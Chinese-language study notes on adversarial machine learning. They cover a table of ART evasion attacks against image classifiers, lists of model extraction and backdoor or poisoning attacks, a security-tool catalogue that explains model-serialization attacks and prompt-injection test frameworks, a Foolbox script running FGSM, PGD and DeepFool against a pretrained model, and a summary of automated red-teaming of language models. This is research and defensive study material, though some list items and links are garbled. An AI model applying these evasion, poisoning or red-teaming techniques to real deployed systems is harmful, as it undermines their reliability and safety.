|Wasserstein|93.69|80|0.14|一個快速增長的工作領域研究了對抗性示例的存在，這些數據點被擾動以愚弄分類器，但這些工作中的絕大多數主要集中在由ℓp範數有界的擾動。在本文中，我們提出了一個基於 Wasserstein 距離的對抗性攻擊的新威脅模型。在影像分類設定中，此類距離測量移動像素品質的成本，這自然涵蓋「標準」影像操作，例如縮放、旋轉、平移和失真（也可能應用於其他設定）。為了產生 Wasserstein 對抗樣本，我們基於 Sinkhorn 迭代的修改版本開發了一個投影到 Wasserstein 球上的程式。由此產生的演算法可以成功地攻擊影像分類模型，使傳統的CIFAR10 模型在半徑為0.1 的Wasserstein 球內的準確率降至3%（即，將影像品質的10% 移動1 像素），並且我們證明基於PGD 的對抗訓練可以將對抗準確率提高到 76%。總的來說，這項工作開闢了對抗穩健性的新研究方向，更正式地考慮凸度量，這些度量準確地捕捉了我們通常認為應該存在於分類器中的不變性。本文中所有實驗的程式碼都可以在此 https URL中找到。
|PE Malware Attacks|93.69|x|x|需要特殊訓練集
|Imperceptible, Robust, and Targeted Adversarial Examples for Automatic Speech Recognition|93.69|x|x|在ART官網找不到|
|Brendel & Bethge Attack|93.69|x|x|沒有
|Audio Adversarial Examples: Targeted Attacks on Speech-to-Text|93.69|x|x|
|High Confidence Low Uncertainty Attack|93.69|x|x|
|Dpatch|93.69|x|x|
|RobustDPatch|93.69|50|0.01|在本文中，我們演示了針對目標檢測器（特別是 YOLOv3 檢測器）的物理對抗性補丁攻擊。與之前關於物理物件檢測攻擊的工作不同，物理物件檢測攻擊要求補丁與被錯誤分類或避免檢測的物件重疊，我們表明，設計得當的補丁幾乎可以抑制圖像中所有檢測到的物件。也就是說，我們可以將貼片放置在圖像中的任何位置，從而使檢測器完全錯過圖像中的所有現有物體，即使是那些遠離貼片本身的物體。這反過來又開闢了針對物件檢測系統的新物理攻擊線，這些系統不需要修改場景中的物件。可以在此 HTTPs URL 中找到系統的演示。
ProjectedGradientDescent          | 93.69             | 10              | 0.11       | Projected Gradient Descent 是一種迭代式的對抗性攻擊方法，被認為是 FGSM 的擴展版本。它通過多次應用梯度上升（針對損失函數）和投影步驟來精細調整對抗性範例。每一次迭代都稍微調整擾動，並確保範例在預定的攻擊範圍內。PGD 透過這種逐步逼近的策略，生成能夠有效欺騙模型的對抗性範例。 |
|ElasticNet|93.69|60|0.02|最近的研究強調了深度神經網路 （DNN） 對對抗性示例的脆弱性——可以很容易地製作視覺上無法區分的對抗性圖像，以導致訓練有素的模型進行錯誤分類。製作對抗性示例的現有方法基於和L_\infty 失真指標。然而，儘管L_1失真解釋了總變化並鼓勵了擾動的稀疏性，但對於製作基於L_1的對抗性示例的研究卻很少。在本文中，我們將通過對抗性示例攻擊 DNN 的過程表述為彈性網路正則化優化問題。我們對 DNN 的彈性網路攻擊 （EAD） 以面向L_1的對抗性示例為特色，並將最先進的 L_2 攻擊作為特例。在MNIST、CIFAR10和ImageNet上的實驗結果表明，EAD可以產生一組獨特的對抗樣本，L_1失真較小，並且在不同的攻擊場景中獲得了與最先進的方法相似的攻擊性能。更重要的是，EAD 提高了攻擊可轉移性，並補充了 DNN 的對抗性訓練，為利用對抗性機器學習中的L_1失真和 DNN 的安全影響提出了新的見解
|AdversarialPatch|95.62|X|X|我們提出了一種在現實世界中創建通用、穩健、有針對性的對抗性圖像補丁的方法。這些補丁是通用的，因為它們可以用來攻擊任何場景，健壯的，因為它們可以在各種轉換下工作，並且是有針對性的，因為它們可以使分類器輸出任何目標類。這些對抗性補丁可以列印、添加到任何場景中、拍照並呈現給圖像分類器;即使補丁很小，它們也會導致分類器忽略場景中的其他專案並報告所選的目標類。為了重現論文的結果，我們的代碼可從以下 HTTPs URL 獲得
|DecisionTreeClassifier|95.62|1.41|X|許多機器學習模型容易受到對抗性示例的影響：專門設計的輸入會導致機器學習模型產生不正確的輸出。影響一個模型的對抗性示例通常會影響另一個模型，即使兩個模型具有不同的架構或在不同的訓練集上進行訓練，只要兩個模型都經過訓練以執行相同的任務。因此，攻擊者可以訓練自己的替代模型，製作針對替代模型的對抗性示例，並將它們轉移到受害者模型中，而關於受害者的資訊很少。最近的工作進一步發展了一種技術，該技術使用受害者模型作為預言機來標記替代者的合成訓練集，因此攻擊者甚至不需要收集訓練集來發起攻擊。我們使用儲層採樣擴展了這些最新技術，以大大提高替代模型訓練過程的效率。我們在以前未探索的（替代、受害者）機器學習模型類對之間引入了新的可轉移性攻擊，最著名的是 SVM 和決策樹。我們僅使用800個受害者模型的查詢，演示了我們對亞馬遜（96.19%錯誤分類率）和谷歌（88.94%）的兩個商業機器學習分類系統的攻擊，從而表明現有的機器學習方法通常容易受到系統性黑盒攻擊，無論其結構如何。
|C&W L_2|95.62|97|X|神經網路為大多數機器學習任務提供了最先進的結果。不幸的是，神經網路容易受到對抗性示例的影響：給定輸入x和任何目標分類t，則可以找到新的輸入x′這類似於x但歸類為t.這使得在安全關鍵領域應用神經網路變得困難。防禦性蒸餾是最近提出的一種方法，它可以採用任意神經網路，並增加其魯棒性，從而降低當前攻擊從中查找對抗性示例的能力的成功率95%自0.5%.在本文中，我們通過引入三種新的攻擊演算法來證明防禦性蒸餾不會顯著提高神經網路的魯棒性，這些演算法在蒸餾和未蒸餾神經網路上都取得了成功100%概率。我們的攻擊是針對文獻中先前使用的三個距離指標量身定製的，與以前的對抗性示例生成演算法相比，我們的攻擊通常更有效（而且從不更糟）。此外，我們建議在一個簡單的可轉移性測試中使用高置信度對抗性示例，我們證明也可以用來打破防禦性蒸餾。我們希望我們的攻擊將被用作未來防禦嘗試的基準，以創建抵抗對抗性示例的神經網路。
|BasicIterativeMethod|95.62|3|X|大多數現有的機器學習分類器都非常容易受到對抗性示例的影響。對抗性示例是輸入數據的樣本，該樣本經過了非常輕微的修改，旨在導致機器學習分類器對其進行錯誤分類。在許多情況下，這些修改可能非常微妙，以至於人類觀察者甚至根本沒有注意到這些修改，但分類器仍然會犯錯誤。對抗性示例會帶來安全問題，因為它們可用於對機器學習系統執行攻擊，即使攻擊者無法訪問基礎模型。到目前為止，之前的所有工作都假設了一個威脅模型，在該模型中，攻擊者可以將數據直接輸入機器學習分類器。對於在物理世界中運行的系統來說，情況並非總是如此，例如那些使用來自攝像頭和其他感測器的信號作為輸入的系統。本文表明，即使在這樣的物理場景中，機器學習系統也容易受到對抗性示例的影響。我們通過將從手機攝像頭獲得的對抗圖像提供給 ImageNet Inception 分類器並測量系統的分類精度來證明這一點。我們發現，即使通過相機感知，很大一部分對抗性示例也被錯誤地分類。
|SaliencyMapMethod|95.62|0|X|深度學習利用大型數據集和計算效率高的訓練演算法，在各種機器學習任務中優於其他方法。然而，深度神經網路訓練階段的缺陷使它們容易受到對抗性樣本的影響：由對手精心製作的輸入，目的是導致深度神經網路錯誤分類。在這項工作中，我們將對手與深度神經網路（DNN）的空間形式化，並引入了一類新的演算法，以基於對DNN輸入和輸出之間映射的精確理解來製作對抗樣本。在計算機視覺的應用中，我們表明，我們的演算法可以可靠地生成由人類受試者正確分類的樣本，但被 DNN 錯誤分類為特定目標，對抗成功率為 97%，而平均僅修改每個樣本 4.02% 的輸入特徵。然後，我們通過定義硬度測量來評估不同樣品類別對對抗性擾動的脆弱性。最後，我們描述了初步工作，通過定義良性輸入和目標分類之間距離的預測度量來概述對對抗性樣本的防禦。
|UniversalPerturbation|95.62|7|X|深度神經網路 （DNN） 容易受到對抗性攻擊。特別是，稱為通用對抗擾動 （UAP） 的單個擾動可以挫敗 DNN 執行的大多數分類任務。因此，需要不同的方法來生成UAP，以全面評估 DNN 的脆弱性。一個現實的評估是考慮有針對性的攻擊的案件;其中，生成的UAP導致 DNN 將輸入分類到特定類中。然而，用於針對性攻擊的UAP的發展在很大程度上落後於用於非針對性攻擊的UAP。因此，我們提出了一種簡單的反覆運算方法來生成針對性攻擊的UAP。我們的方法結合了用於生成非目標 UAP 的簡單反覆運算方法和用於為輸入生成目標對抗擾動的快速梯度符號方法。我們將所提出的方法應用於最先進的 DNN 模型進行圖像分類，並證明瞭存在幾乎難以察覺的針對性攻擊的 UAP;此外，我們證明瞭這種UAP很容易生成。
|FeatureAdversariesNumpy|95.62|太久|X
|DeepFool|93.69|10|0.01|DeepFool 是一種對抗性攻擊方法，旨在有效地找到模型分類錯誤的最小擾動。它透過迭代過程逼近模型的決策邊界，並計算將輸入數據推向該邊界的最小擾動。每次迭代中，DeepFool 估計多類別分類器的決策邊界，然後更新輸入數據以更接近這些邊界。這種方法特別高效，因為它直接針對模型的弱點，生成在人類感知上幾乎不可察覺但對模型卻高度有效的微小擾動。DeepFool 在尋找對抗性範例時注重精確度和效率，使其成為一種強大的工具來測試和改進機器學習模型的魯棒性。
|Virtual Adversarial Method|95.62|太久|X
|SquareAttack|95.62|11|x|我們提出了Square Attack，這是一種基於分數的黑盒和l_\infty-adversarial攻擊，它不依賴於局部梯度資訊，因此不受梯度掩蔽的影響。Square Attack 基於隨機搜索方案，該方案在隨機位置選擇局部的方形更新，以便在每次反覆運算時擾動大致位於可行集的邊界處。與最先進的方法相比，我們的方法的查詢效率明顯更高，成功率更高，尤其是在非靶向環境中。特別是，在ImageNet上，與Al-Dujaili和O'Reilly最近最先進的l_\infty攻擊相比，我們將各種深度網路在非目標設置中的平均查詢效率提高了至少1.8倍，最高可達3倍。此外，雖然我們的攻擊是黑盒攻擊，但它也可以在標準基準測試上勝過基於梯度的白盒攻擊，在成功率方面達到了新的水準。我們的攻擊代碼可在此 HTTPs URL 上找到。
|HopSkipJump|95.62|10|X|對經過訓練的模型進行基於決策的對抗性攻擊的目標是僅根據觀察目標模型返回的輸出標籤來生成對抗性示例。我們開發了 HopSkipJumpAttack，這是一系列基於在決策邊界使用二進位資訊對梯度方向進行新估計的演算法。擬議的系列包括針對以下目標優化的非針對性和針對性攻擊ℓ2和ℓ∞相似性指標。對所提演算法和梯度方向估計進行了理論分析。實驗表明，與邊界攻擊相比，HopSkipJumpAttack 需要的模型查詢要少得多。它還在攻擊幾種廣泛使用的防禦機制方面取得了競爭性能。（HopSkipJumpAttack 在預印本的先前版本中被命名為 Boundary Attack++。
|PixelAttack|95.62|0|x|各種類型的機器學習演算法存在大量的對抗性攻擊和防禦，這使得評估演算法的魯棒性成為一項艱巨的任務。更糟糕的是，這些對抗性演算法存在內在偏見。在這裡，我們組織了面臨的問題：a）模型依賴性，b）評估不足，c）虛假對抗樣本，以及d）擾動依賴性結果）。基於此，我們提出了一種與模型無關的雙重質量評估方法，以及魯棒性水準的概念來解決這些問題。我們驗證了最先進的神經網路（WideResNet、ResNet、AllConv、DenseNet、NIN、LeNet 和 CapsNet）的雙重質量評估以及圖像分類問題的對抗防禦。我們進一步表明，當前的網路和防禦在各個級別的魯棒性上都是脆弱的。建議的穩健性評估表明，根據所使用的指標（即L0或L∞），魯棒性可能會有很大差異。因此，為了正確評估，應考慮二元性。此外，數學推導以及反例表明L1和L2僅靠指標不足以避免虛假的對抗性樣本。有趣的是，所提出的評估的閾值攻擊是一種新穎的L∞黑匣子對抗方法，需要比單圖元攻擊更少的擾動（僅12%One-Pixel Attack 的擾動量）以達到類似的結果。代碼可在此 HTTP URL 中找到。
|ThresholdAttack|95.62|太久|X|
|SimBA|95.62|太久|X
FGSM                              | 93.69             | 0               | 0.16       | FGSM 是一種快速且高效的對抗性攻擊方法，由 Ian Goodfellow 等人提出。它透過計算輸入數據對模型損失的梯度，並使用這些梯度的符號來創建小的、有方向的擾動。這些擾動加到原始輸入上，以使模型做出錯誤的預測。FGSM 的關鍵優勢在於其簡潔和快速，通常只需要一次梯度更新即可生成對抗性範例，使其成為評估模型魯棒性的常用工具。 |
| CarliniLInfMethod                 | 93.69             | 10              | 0.03       | Carlini & Wagner L-Infinity Method 是一種高度精確的對抗性攻擊技術。它優化了一個特定的目標函數，不僅考慮了模型輸出和目標輸出之間的差異，還確保了對抗性範例和原始輸入之間的最大偏差在預定的範數限制內。這種方法通過精細調整擾動來找到幾乎不被人類察覺的對抗性範例，從而有效地欺騙機器學習模型。 |
| 
|FeatureAdversariesNumpy|93.69|x|x|
|Boundary Attack|93.69|50|x|許多機器學習演算法容易受到其輸入幾乎難以察覺的擾動的影響。到目前為止，尚不清楚對抗性擾動對真實世界機器學習應用程式的安全性有多大風險，因為用於生成此類擾動的大多數方法要麼依賴於詳細的模型資訊（基於梯度的攻擊），要麼依賴於置信度分數，例如類概率（基於分數的攻擊），這兩種方法在大多數現實世界的場景中都不可用。在許多情況下，人們目前需要退回到基於轉移的攻擊，這些攻擊依賴於繁瑣的替代模型，需要訪問訓練數據並且可以防禦。在這裡，我們強調攻擊的重要性，這些攻擊完全依賴於最的模型決策。這種基於決策的攻擊（1）適用於現實世界的黑匣子模型，如自動駕駛汽車，（2）比基於轉移的攻擊需要更少的知識，更容易應用，（3）比基於梯度或分數的攻擊更適用於簡單的防禦。以前此類攻擊僅限於簡單模型或簡單數據集。在這裡，我們介紹邊界攻擊，這是一種基於決策的攻擊，它從大型對抗性擾動開始，然後尋求在保持對抗性的同時減少擾動。該攻擊在概念上很簡單，幾乎不需要超參數調整，不依賴於替代模型，並且與標準計算機視覺任務（如 ImageNet）中最好的基於梯度的攻擊具有競爭力。我們從這個 HTTP URL 對兩個黑盒演算法進行攻擊。特別是邊界攻擊和一般的基於決策的攻擊類別，為研究機器學習模型的魯棒性開闢了新的途徑，並提出了有關已部署機器學習系統安全性的新問題。該攻擊的實現可作為 Foolbox 的一部分，位於此 https URL 。

---

## 更多工具清單與參考


每個攻擊手法都有不同參數使用方Dpatch [doc](https://adversarial-robustness-toolbox.readthedocs.io/en/latest/modules/attacks/evasion.html)

evasion攻擊手法
1. **Adversarial Patch**: 這種攻擊涉及創建一個對抗性貼片，當貼在圖像上時，能夠誤導機器學習模型的預測。

2. **Adversarial Patch - Numpy**: 這是 Adversarial Patch 攻擊的 Numpy 版本，適用於方形和矩形圖像。

3. **Adversarial Patch - PyTorch**: 這是 Adversarial Patch 攻擊的 PyTorch 版本，支持對貼片進行不同的轉換。

4. **Adversarial Patch - TensorFlowV2**: 這是 Adversarial Patch 攻擊的 TensorFlow v2 版本，也支持多種貼片轉換。

5. **Adversarial Texture - PyTorch**: 這是一種針對物體追蹤器的對抗性紋理攻擊，在 PyTorch 中實現。

6. **Auto Attack**: 這是一種自動化的攻擊方法，它結合了多種攻擊策略來找到最有效的對抗性範例。

7. **Auto Projected Gradient Descent (Auto-PGD)**: 這是一種自動化的投影梯度下降攻擊，用於生成對抗性範例。

8. **Auto Conjugate Gradient (Auto-CG)**: 這是一種基於共軛梯度方法的自動化攻擊。

9. **Boundary Attack / Decision-Based Attack**: 這種攻擊方法不需要梯度資訊，而是通過探索決策邊界來生成對抗性範例。

10. **Brendel and Bethge Attack**: 這是一種基於決策邊界的攻擊，它從原始範例開始，逐步逼近決策邊界。

11. **Carlini and Wagner L_0 Attack**: 這是 Carlini 和 Wagner 提出的一種攻擊，目標是改變最少數量的輸入特徵。

12. **Carlini and Wagner L_2 Attack**: 這是 Carlini 和 Wagner 提出的另一種攻擊，旨在最小化輸入變化的 L2 範數。

13. **Carlini and Wagner L_inf Attack**: 這是 Carlini 和 Wagner 提出的第三種攻擊，旨在最小化輸入變化的 L∞ 範數。

14. **Carlini and Wagner ASR Attack**: 這是針對自動語音識別系統的攻擊。

15. **





**: 這是針對決策樹模型的攻擊。

16. **DeepFool**: 這是一種高效的攻擊方法，旨在找到最小的擾動，使模型的預測發生變化。

17. **DPatch**: 這是一種針對物體檢測系統的攻擊，通過在圖像中添加一個小的對抗性貼片來誤導檢測。

18. **RobustDPatch**: 這是 DPatch 的一個變體，旨在提高對抗性貼片的穩健性。

19. **Elastic Net Attack**: 這是一種結合 L1 和 L2 正則化的攻擊方法。

20. **Fast Gradient Method (FGM)**: 這是一種快速的梯度攻擊方法，通過利用輸入對損失的梯度來生成對抗性範例。

21. **Feature Adversaries - Numpy**: 這種攻擊旨在改變模型的內部特徵表示，而不是直接針對輸出標籤。

22. **Feature Adversaries - PyTorch**: 這是 Feature Adversaries 攻擊的 PyTorch 實現。

23. **Feature Adversaries - TensorFlow**: 這是 Feature Adversaries 攻擊的 TensorFlow 實現。

24. **Frame Saliency Attack**: 這種攻擊利用影像中的顯著性區域來生成對抗性範例。

25. **Geometric Decision Based Attack**: 這是一種基於幾何決策的攻擊，不依賴於梯度資訊。

26. **GRAPHITE - Blackbox**: 這是一種黑盒攻擊，不需要知道模型的內部結構或參數。

27. **GRAPHITE - Whitebox - PyTorch**: 這是 GRAPHITE 攻擊的白盒版本，針對 PyTorch 模型。

28. **High Confidence Low Uncertainty Attack**: 這種攻擊生成高信心但低不確定性的對抗性範例。

29. **HopSkipJump Attack**: 這是一種基於邊界的攻擊，不需要梯度資訊。

30. **Imperceptible ASR Attack**: 這是針對自動語音識別系統的對抗性攻擊，生成難以察覺的對抗性語

##### ART `extraction` 模組攻擊手法

1. **Copycat CNN**: 利用從目標模型獲得的輸出來訓練一個新的模型，目的是複製目標模型的功能。不需要知道目標模型的內部結構或參數。

2. **Functionally Equivalent Extraction (FEE)**: 從目標模型中提取一個功能上等價的模型。這種攻擊通過比較目標模型和提取模型的輸出來進行。

3. **Knockoff Nets**: 使用從目標模型獲得的預測來訓練一個新的模型，從而複製目標模型的行為。不需要對目標模型進行任何修改。

##### ART `poisoning` 模組攻擊手法

1. **Backdoor Attack DGM ReD**: 這種攻擊使用深度生成模型 (DGM) 和隨機彈性變形 (ReD) 來創建後門攻擊。

2. **Backdoor Attack DGM Trail**: 利用深度生成模型 (DGM) 和軌跡技術來實施後門攻擊。

3. **Adversarial Embedding Attack**: 這種攻擊通過嵌入對抗性信息到訓練數據中來污染模型。

4. **Backdoor Poisoning Attack**: 這是一種後門污染攻擊，通過在訓練數據中加入特定的後門樣本來影響模型的行為。

5. **Hidden Trigger Backdoor Attack**: 這種攻擊在訓練數據中隱藏觸發器，當模型遇到含有這些觸發器的輸入時，會產生錯誤的預測。

6. **Bullseye Polytope Attack**: 這種攻擊創建一個多面體區域，當模型的訓練數據落入這個區域時，會導致模型的預測偏差。

7. **Clean Label Backdoor Attack**: 這是一種後門攻擊，其中污染的樣本保持其原始標籤，使攻擊更難被察覺。

8. **Feature Collision Attack**: 利用特徵碰撞技術來生成污染樣本。這些樣本在特徵空間中與目標樣本相似，但在像素空間中看起來不同。

9. **Gradient Matching Attack**: 這種攻擊通過匹配梯度分佈來生成污染樣本，從而影響模型的訓練過程。

10. **Poisoning SVM Attack**: 這是針對支持向量機 (SVM) 模型的污染攻擊，通過修改訓練數據來影響模型的決策邊界。

11. **Sleeper Agent Attack**: 這種攻擊創建“睡眠代理”，在特定條件下激活，從而影響模型的預測。


![](https://hackmd.io/_uploads/H1f9teMX6.png)


- [ModelScan](https://github.com/Azure/counterfit/)
ML Model Serialization Attacks.**模型序列化攻擊是指模型保存時，加上惡意程式碼，導致使用者在加載模型時運行惡意程式，modelscan透過掃描模型字節內容，確認安全性。**

    **模型序列化攻擊可用於執行：**
    >***認證盜竊（用於向環境中的其他系統寫入和讀取資料的雲憑據）
    資料盜竊（發送給模型的請求）
    資料中毒（模型執行工作後傳送的資料 ）
    模型中毒（改變模型本身的結果）***
- [NB Defense](https://nbdefense.ai) - Jupyter Notebooks. &CLI

    >**[操作教學(Announcing NB Defense: The Starting Point of ML Security)](https://protectai.com/blog/announcing-nb-defense)** 
    >**[操作教學(NB Getting started)](https://nbdefense.ai/getting-started/)**  
    >**[操作教學(github)](https://github.com/protectai/nbdefense)**
- [Garak](https://github.com/leondz/garak) -  LLM 漏洞掃描器。.
**目前用於LLM模型上，所支援的LLM有以下這些**
    >[Hugging face hub generative models](https://huggingface.co/models)
    [replicate](https://replicate.com/) text models
    [openai api](https://platform.openai.com/docs/introduction) chat & continuation models
    ggml models like [llama.cpp](https://github.com/ggerganov/llama.cpp)
- [Adversarial Robustness Toolbox](https://github.com/IBM/adversarial-robustness-toolbox) - 機器學習模型對抗對抗性攻擊的防禦方法庫。
   >* **[ART example](https://github.com/Trusted-AI/adversarial-robustness-toolbox/blob/main/examples/README.md)**
    >* **[ART使用教學](https://www.cnblogs.com/bonelee/p/16399758.html)**
    >* **[ART攻擊種類](https://github.com/Trusted-AI/adversarial-robustness-toolbox/wiki/ART-Attacks)**
    >>* Evasion Attacks
    >>* Poisoning Attacks
    >>* Extraction Attacks
    >>* Inference Attacks

- [MLSploit](https://github.com/mlsploit/) - MLsploit 是一個用於對抗性機器學習研究互動式實驗的雲端框架。
    >**[MLsploit](https://mlsploit.github.io/) 是第一個使用者友好、基於雲的系統，使研究人員和從業者能夠快速評估和比較機器學習 （ML） 模型的最先進的對抗性攻擊和防禦。**
- [TensorFlow Privacy](https://github.com/tensorflow/privacy) - 隱私保護機器學習演算法和工具庫。
- [Foolbox](https://github.com/bethgelab/foolbox) - 用於建立和評估對抗性攻擊和防禦的 Python 工具箱。.

#### 安裝建置（Foolbox）

```
!pip install foolbox
```

#### demo

```python
#!/usr/bin/env python3
import torchvision.models as models
import eagerpy as ep
from foolbox import PyTorchModel, accuracy, samples
import foolbox.attacks as fa
import numpy as np

if __name__ == "__main__":
    # 實例化一個模型（也可以是 TensorFlow 或 JAX 模型）
    model = models.resnet18(pretrained=True).eval()
    preprocessing = dict(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225], axis=-3)
    fmodel = PyTorchModel(model, bounds=(0, 1), preprocessing=preprocessing)

    # 獲取數據並測試模型
    # 使用 ep.astensors 包裝張量是可選的，但它允許我們在後續操作中使用 EagerPy 張量
    images, labels = ep.astensors(*samples(fmodel, dataset="imagenet", batchsize=16))
    clean_acc = accuracy(fmodel, images, labels)
    print(f"原始準確率:  {clean_acc * 100:.1f} %")
    print("")

    # 定義攻擊方法列表
    attacks = [
        fa.FGSM(),
        fa.LinfPGD(),
        fa.LinfBasicIterativeAttack(),
        fa.LinfAdditiveUniformNoiseAttack(),
        fa.LinfDeepFoolAttack(),
    ]

    # 定義 epsilon 值列表
    epsilons = [
        0.0,
        0.0005,
        0.001,
        0.0015,
        0.002,
        0.003,
        0.005,
        0.01,
        0.02,
        0.03,
        0.1,
        0.3,
        0.5,
        1.0,
    ]
    print("epsilons")
    print(epsilons)
    print("")

    # 計算每種攻擊在不同 epsilon 下的成功率
    attack_success = np.zeros((len(attacks), len(epsilons), len(images)), dtype=np.bool)
    for i, attack in enumerate(attacks):
        _, _, success = attack(fmodel, images, labels, epsilons=epsilons)
        assert success.shape == (len(epsilons), len(images))
        success_ = success.numpy()
        assert success_.dtype == np.bool
        attack_success[i] = success_
        print(attack)
        print("  ", 1.0 - success_.mean(axis=-1).round(2))

    # 計算並報告在受攻擊時的模型魯棒準確率（使用每個樣本的最佳攻擊）
    robust_accuracy = 1.0 - attack_success.max(axis=0).mean(axis=-1)
    print("")
    print("-" * 79)
    print("")
    print("最壞情況（每個樣本的最佳攻擊）")
    print("  ", robust_accuracy.round(2))
    print("")

    # 報告不同擾動下的魯棒準確率
    print("對於以下擾動的魯棒準確率")
    for eps, acc in zip(epsilons, robust_accuracy):
        print(f"  Linf 範數 ≤ {eps:<6}: {acc.item() * 100:4.1f} %")

```
![image](https://hackmd.io/_uploads/Hyi7vaSHT.png)

- [Advertorch](https://github.com/BorealisAI/advertorch) -  用於adversarial robustness 研究的 Python 工具箱。
- [Artificial Intelligence Threat Matrix](https://collaborativeaicontrols.github.io/ATM/) - 用於識別和減輕機器學習系統威脅的框架。
- [Adversarial ML Threat Matrix](https://github.com/mitre/advmlthreatmatrix) -Adversarial Machine Learning Threat Matrix ([ATLAS](https://www.mitre.org/news-insights/impact-story/mitre-microsoft-and-11-other-organizations-take-machine-learning-threats))基於mitre框架
    >[針對機器學習系統的網路攻擊比您想像的更常見](https://www.microsoft.com/en-us/security/blog/2020/10/22/cyberattacks-against-machine-learning-systems-are-more-common-than-you-think/)
    >[Atlas github](https://github.com/mitre/advmlthreatmatrix)
- [CleverHans](https://github.com/cleverhans-lab/cleverhans) - 機器學習模型的對抗性範例和防禦庫
- [AdvBox](https://github.com/advboxes/AdvBox) - Advbox is a toolbox to generate adversarial examples that fool neural networks in PaddlePaddle、PyTorch、Caffe2、MxNet、Keras、TensorFlow.
- [Audit AI](https://github.com/pymetrics/audit-ai) - Bias Testing for Generalized Machine Learning Applications.
- [Deep Pwning](https://github.com/cchio/deep-pwning) - Deep-pwning is a lightweight framework for experimenting with machine learning models with the goal of evaluating their robustness against a motivated adversary. 
- [Privacy Meter](https://github.com/privacytrustlab/ml_privacy_meter) - An open-source library to audit data privacy in statistical and machine learning algorithms.
- [TensorFlow Model Analysis](https://github.com/tensorflow/model-analysis) - A library for analyzing, validating, and monitoring machine learning models in production.
- [PromptInject](https://github.com/agencyenterprise/PromptInject) - A framework that assembles adversarial prompts.
- [TextAttack](https://github.com/QData/TextAttack) - TextAttack is a Python framework for adversarial attacks, data augmentation, and model training in NLP.
- [OpenAttack](https://github.com/thunlp/OpenAttack) - An Open-Source Package for Textual Adversarial Attack.
- [TextFooler](https://github.com/jind11/TextFooler) - A Model for Natural Language Attack on Text Classification and Inference.
- [Flawed Machine Learning Security](https://github.com/EthicalML/fml-security) - Practical examples of "Flawed Machine Learning Security" together with ML Security best practice across the end to end stages of the machine learning model lifecycle from training, to packaging, to deployment.
- [Adversarial Machine Learning CTF](https://github.com/arturmiller/adversarial_ml_ctf) - This repository is a CTF challenge, showing a security flaw in most (all?) common artificial neural networks. They are vulnerable for adversarial images.
- [Damn Vulnerable LLM Project](https://github.com/harishsg993010/DamnVulnerableLLMProject) - A Large Language Model designed for getting hacked
- [Gandalf Lakera](https://gandalf.lakera.ai/) - Prompt Injection CTF playground

---

## Red Team
### 摘要　
（Abstract）部分提到，語言模型（Language Models, LMs）常常因為有潛在的傷害性而無法被部署。傳統的方法是在部署前，使用人工標註來識別有害行為。然而，這樣的方法成本高昂，並限制了測試用例的數量和多樣性。本研究自動找出目標語言模型在哪些情況下會表現出有害行為，並使用另一個語言模型來生成測試用例（即“紅隊測試”）。研究還探討了多種生成測試用例的方法，從零標註生成到強化學習。

### Introdution
這篇論文的簡介部分開始於語言模型（Language Models, LMs）在多種應用中的潛力，包括作為對話助手和問答系統。然而，這些模型在實際應用中也帶來了一系列問題，特別是在與用戶互動時可能會產生不可預測的傷害。為了說明這一點，簡介提到了Microsoft的聊天機器人Tay，這是一個因為發送種族主義和性暗示的推文而被撤下的例子。

除了Tay之外，簡介還提到了其他研究，這些研究發現語言模型會生成不準確或機密的個人信息。這些失敗不僅會傷害用戶，而且會對企業和研究機構造成嚴重的法律和道德問題。因此，簡介強調，在部署這些模型之前，發現和修復這些問題是至關重要的。

簡介部分也提到了目前解決這些問題的一些方法，特別是人工標註。傳統上，研究人員會使用人工標註來識別模型可能的有害行為，然後根據這些標註來調整或訓練模型。然而，這種方法有兩個主要的缺點：一是成本高昂，二是它限制了測試用例的數量和多樣性。

為了解決這些問題，這篇論文提出了一種新的方法，即使用另一個語言模型來自動生成測試用例（也稱為“紅隊測試”）。這種方法不僅可以大大減少人工標註的成本，而且可以生成更多和更多樣化的測試用例，從而更全面地評估目標模型的性能和安全性。

簡介最後還提到了論文將探討的一些具體方法，包括從零標註生成到強化學習，以及如何使用這些方法來生成不同程度的多樣性和難度的測試用例。

總體而言，這篇論文的簡介部分為讀者提供了一個全面的背景，解釋了為什麼需要新的方法來評估和改進語言模型，特別是在考慮到它們可能帶來的傷害和風險時。

### RT Model
1. 問題背景和挑戰
這部分通常會討論語言模型（LMs）在實際應用中面臨的主要問題和挑戰。這些問題通常包括生成有害或冒犯性的內容、散播錯誤信息、以及泄露機密或個人信息。這些問題不僅會對用戶造成傷害，而且會對企業和研究機構帶來嚴重的法律和道德風險。因此，找到一種有效的方法來評估和改進語言模型的安全性和效能是至關重要的。

2. 紅隊測試（Red Teaming）的概念和應用
"Red Teaming" 是一種來自資訊安全領域的術語，用於描述一種模擬攻擊的過程，目的是找出系統的弱點和漏洞。在這篇論文中，這個概念被應用於語言模型的測試和評估。具體來說，研究人員使用一個語言模型來自動生成測試用例，然後使用這些測試用例來評估另一個目標語言模型。這種方法的優點是能夠大大減少人工標註的成本和時間，同時也能生成更多和更多樣化的測試用例。

3. 測試用例的生成方法
論文進一步探討了如何使用不同的方法來生成測試用例，包括零標註生成（Zero-shot Generation）和強化學習（Reinforcement Learning）。這些方法不僅可以用來評估目標模型是否會生成有害或冒犯性的內容，還可以用來評估模型在其他方面的性能和安全性。

4. 自動評估和分類
除了生成測試用例，論文還探討了如何使用分類器來自動評估生成的測試用例。這樣可以更有效地識別出模型的弱點和漏洞，並提供更全面的評估結果。

這些主要部分共同構成了"Red Teaming Language Models"這篇論文的核心框架和研究方法。每一部分都對於理解和改進語言模型的安全性和效能具有重要的意義。

### Red Teaming Offensive Language

LM基於的對話系統有生成冒犯性內容的風險。他們首先試圖找到能從Dialogue-Prompted Gopher (DPG)中引出冒犯性回覆的文本。DPG使用Gopher LM生成對話，並使用核心抽樣方法。他們還使用Gopher LM作為紅隊LM，並訓練一個模型來預測對話歷史中的發言是否冒犯。

### 過程中問題和挑戰

1. 生成冒犯性回覆的方法：這一點突顯了紅隊測試的能力，即揭示語言模型在面對具有冒犯性的問題或提示時可能會產生的冒犯性回覆。這顯示了紅隊測試的重要性，因為它可以幫助我們了解模型在這些情境下的行為。例如，如果一個方法問：“為什麼某某族群是壞的？”，這本身就是一個冒犯性的問題，並可能導致模型給出冒犯性的答案。

2. 所有方法的共同點：這一點表明，不同的紅隊測試方法都能揭示模型的冒犯性回覆，無論問題或提示是否直接具有冒犯性。這再次強調了紅隊測試的多樣性和徹底性。例如，即使問題看起來是中立的或無害的，模型仍然可能給出冒犯性的答案。

